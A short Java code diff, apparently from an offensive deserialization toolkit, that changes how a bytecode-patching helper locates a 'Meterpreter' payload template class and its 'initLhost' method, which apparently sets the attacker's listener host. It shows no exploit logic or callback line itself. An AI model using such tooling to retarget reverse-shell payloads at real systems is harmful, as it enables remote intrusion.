@@ -40,7 +40,7 @@ public class ClassByteChange {
         cPool.importPackage("java.io.OutputStream");
         cPool.importPackage("java.util.HashMap");
         //获取该class对象
-        CtClass cClass = cPool.get("Meterpreter");
+        CtClass cClass = cPool.get("com.qi4l.JYso.template.Meterpreter");
         //获取到对应的方法
         CtMethod cMethodHost = cClass.getDeclaredMethod("initLhost");
 
@@ -49,7 +49,7 @@ public class ClassByteChange {
 
         //替换原有的文件
         cClass.writeFile(ap);
-        InputStream in = Files.newInputStream(Paths.get(ap + File.separatorChar + "Meterpreter.class"));
+        InputStream in = Files.newInputStream(Paths.get(ap + File.separatorChar + "com.qi4l.JYso.template.Meterpreter.class"));
         return Utils.getBytes(in);
 
 
